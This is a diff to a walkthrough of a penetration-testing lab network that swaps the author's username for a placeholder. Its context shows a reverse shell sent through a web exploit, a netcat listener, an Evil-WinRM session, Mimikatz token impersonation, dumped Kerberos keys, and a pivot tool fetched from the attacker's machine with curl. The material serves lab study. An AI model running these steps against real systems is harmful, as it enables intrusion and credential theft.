@@ -932,7 +932,7 @@ Time to go for a reverse shell on the device, let's go into BurpSuite and grab a
 * Use CTRL-U to URL-encode the shell command.
 
 ```
-POST /web/exploit-Ferrari404.php HTTP/1.1
+POST /web/exploit-USERNAME.php HTTP/1.1
 
 Host: 10.200.72.150
 
@@ -964,7 +964,7 @@ Now let's go ahead and hit send to get our reverse shell!
 ### Win! We now have a shell on 2 of the devices in the network!
 
 ```
-./nc-Ferrari -lvnp 30603
+./nc-USERNAME -lvnp 30603
 Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
 Ncat: Listening on :::30603
 Ncat: Listening on 0.0.0.0:30603
@@ -1036,7 +1036,7 @@ Evil-WinRM shell v2.4
 
 Info: Establishing connection to remote endpoint
 
-*Evil-WinRM* PS C:\Users\Ferrari404\Documents> 
+*Evil-WinRM* PS C:\Users\USERNAME\Documents> 
 ```
 
 Notes on RDP:
@@ -1090,7 +1090,7 @@ SID name  : NT AUTHORITY\SYSTEM
 
 672     {0;000003e7} 1 D 20128          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
  -> Impersonated !
- * Process Token : {0;0007f416} 2 F 1092103     GIT-SERV\Ferrari404     S-1-5-21-3335744492-1614955177-2693036043-1002
+ * Process Token : {0;0007f416} 2 F 1092103     GIT-SERV\USERNAME     S-1-5-21-3335744492-1614955177-2693036043-1002
 (15g,24p)       Primary
  * Thread Token  : {0;000003e7} 1 D 1309425     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
@@ -1197,7 +1197,7 @@ Supplemental Credentials:
     Random Value : 20e21de55c9574fdfe2006fec61786d2
 
 * Primary:Kerberos-Newer-Keys *
-    Default Salt : GIT-SERVFerrari404
+    Default Salt : GIT-SERVUSERNAME
     Default Iterations : 4096
     Credentials
       aes256_hmac       (4096) : 5f6ab3c0b1b8a6109311045e7649bad97e0785594addbc5507570d4f65092f35
@@ -1216,7 +1216,7 @@ Supplemental Credentials:
     NTLM-Strong-NTOWF
 
 * Primary:Kerberos *
-    Default Salt : GIT-SERVFerrari404
+    Default Salt : GIT-SERVUSERNAME
     Credentials
       des_cbc_md5       : 461643fb43f8ef19
     OldCredentials
@@ -1543,7 +1543,7 @@ python3 -m http.server 80
 * Curl the zip file from the ssh session into your directory you made on .200.
 
 ```
-[root@prod-serv hop-Ferrari404]# curl tun0-IP/hop.zip -o hop.zip
+[root@prod-serv hop-USERNAME]# curl tun0-IP/hop.zip -o hop.zip
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  2961  100  2961    0     0  14100      0 --:--:-- --:--:-- --:--:-- 14100
@@ -1564,7 +1564,7 @@ Archive:  hop.zip
 admin  hop.zip  login  news.php
 [root@prod-serv hop-USERNAME]# php -S 0.0.0.0:22903 &>/dev/null &
 [1] 3332
-[root@prod-serv hop-Ferrari404]# ss -tulwn | grep 22903
+[root@prod-serv hop-USERNAME]# ss -tulwn | grep 22903
 tcp     LISTEN   0        128              0.0.0.0:22903          0.0.0.0:* 
 ```
 
